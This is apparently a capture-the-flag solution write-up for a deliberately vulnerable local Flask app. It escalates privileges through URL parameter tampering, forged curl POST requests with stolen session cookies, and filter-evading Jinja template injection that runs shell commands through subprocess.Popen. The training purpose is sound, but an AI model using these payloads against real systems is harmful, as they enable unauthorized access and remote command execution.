# Who Stole my Flask? Solution

For this challenge you will need to determine how to take advantage of vulnerabilities present in the 
flask applications so that you can elevate your privileges.

There are three flags in this challenge. Each flag is given when the challenger acquires new permissions/
upgrades their account role. They will be present on the HTML pages.

The method for solving it is as follows:

### Create an account
 - Go to the URL `localhost:5000` to check out the site and begin interacting with it.
 - Go to the `Sign Up` section to create an account so that you can log in to the site to see what is available to the default user.

### Analyze Profile Page for a Vulnerability
 - If you read the HTML code on the `/profile` page, you will see a comment stating that there is URL POST functionality that has been slated to be removed but has not been done yet.
 - This should be a hint to then attempt to try to change your role from 'user' to 'admin'
 - This can be done by going to the following URL: `localhost:5000/profile?userrole=admin&role=admin`
 - If done correctly, your profile page will show that the role for your account is now 'admin'
 - `Token1` will be present on the `admin` page

### Begin Analyzing the Admin Page for a Vulnerability
 - You will find that there is a lot of functionality on the admin page. 
 - The vulnerable part here will be the `Add User` section, where it explains that the default role assigned to new users is 'user'.
 - You can see that there are multiple fields to a users account including `name`, `username`, `email`, `note`, and `role`, but the form for `Add User` only shows four of those.
 - Your next move should be to craft your own POST request using all the fields present to attempt to overwrite the default role that is submitted when creating a new user.
 - This can be done using the following steps:
    1. Analyze the form being used when you create a user. This will help you determine the field names.
    2. Get a session cookie for your account that you can store on your machine using the following command. It will be combined with a curl request to forge a form POST request.
         ```
         curl -c cookies.txt -d 'email=youremail@email.com&password=yourPassword' http://localhost:5000/login
         ``` 
   - Note: Substitute `youremail@email.com` and `yourPassword` with the email and password you chose when creating an account.
    3. You can now forge the CURL command to create an unauthorized POST request. This can be done using the following command: 
         ```
         curl -X POST -b cookies.txt -d 'formVal2=Submit&addname=johnSmith&&addpassword=password&addusername=john&addemail=john@smith.com&addrole=dev' http://localhost:5000/admin
         ```
    4. You should get a response back with the pages content. Login with the new user and you will see that you have the `dev` role now.

### Start Crafting SSTI
 - You will now have access to the `dev` page which contains `Token2`.
 - The HTML page is plain but it is intended for devs to do testing and have full access to the system. You can now begin crafting your template injection in the URL to leverage this access.
 - It will take some trial and error, but you must start working through the objects in the Jinja template using this injection point to determine what processes are available to you.
 - The first step is to see what subclasses are available to leverage. A list of them can be populated by going to the following URL: `http://localhost:5000/dev?cmd={{[].__class__.__base__.__subclasses__()}}`
 - An error saying "Unauthorized characters have been entered" will pop up. If you inspect the command, you'll see that it is missing the `.`'s. This is a sign that you will need to craft your injection without the use of periods.
 - To pass the security checks, the new command will be: `http://localhost:5000/dev?cmd={{''['__class__']['__base__']['__subclasses__']()}}`
 - Analyze the list to determine your vector of attack. For this example, we will use the `subprocess.Popen` class.
 - Determine what entry in that list represents `subprocess.Popen` using string processing. For our example, it was entry `212`.
   - Copy the text contents of the page (the full list of <class 'class.name'> entries).
   - Open a Python 3 interpreter.
   - Save the copied text as a variable `s`.
   - Enter the following code:
      ```
      s = s[1:-1]
      s = s.split(",")
      for i, c in enumerate(s):
         if "Popen" in c:
            print(i)
      ```
 - To use the `subprocess.Popen` class, browse to the following webpage, replacing `212` with the value found: `http://localhost:5000/dev?cmd={{''['__class__']['__base__']['__subclasses__']()[212]}}`
 - From here you will need to craft a command to find the `flag.txt` file and show its contents. It will take some trial and error to get your desired output.
 - Browse to this webpage to show the final token: `http://localhost:5000/dev?cmd={{''['__class__']['__base__']['__subclasses__']()[212]('cat flag*',shell=True,stdout=-1)['communicate']()}}`


## Flags
 - Token1: Hex string available on the `/admin` page once you gain access
 - Token2: Hex string available on the `/dev` page once you gain access
 - Token3: Hex string inside the `flag.txt` file once you gain access